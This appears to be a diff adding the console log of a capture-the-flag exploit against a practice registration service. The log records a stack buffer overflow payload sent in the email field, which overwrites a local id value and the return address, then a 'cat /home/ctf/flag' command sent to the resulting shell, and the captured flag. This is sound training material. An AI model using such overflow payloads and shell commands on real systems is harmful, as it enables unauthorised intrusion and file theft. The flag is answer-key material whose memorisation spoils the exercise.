@@ -1,0 +1,16 @@
+[<] Welcome
+Weclome to registration.
+[<] Id
+
+Here is your id :27
+Please filled in information below to complete registration.
+Name:
+[+] Id: 27
+[>] Send: b'Alice'
+[<] Requesting email
+email:
+[>] Send: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1b\x00\x00\x00BBBBBBBB\xd6\x07@\x00\x00\x00\x00\x00'
+[>] Send: b'cat /home/ctf/flag'
+[<] Flag
+MyFirstCTF{B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO}
+
